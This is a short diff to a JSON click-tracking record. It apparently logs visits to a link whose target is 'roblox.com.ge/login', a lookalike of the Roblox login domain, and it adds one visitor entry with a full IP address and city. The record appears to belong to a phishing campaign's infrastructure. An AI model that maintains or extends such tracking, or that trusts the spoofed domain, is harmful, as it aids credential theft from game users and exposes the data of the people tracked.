@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1587,
+    "useCount": 1588,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12864,6 +12864,14 @@
         "city": "Kuching",
         "flag": "🇲🇾",
         "countryCode": "MY"
+      },
+      {
+        "timestamp": 1777465898572,
+        "ip": "171.234.8.101",
+        "country": "Vietnam",
+        "city": "Buon Ma Thuot",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
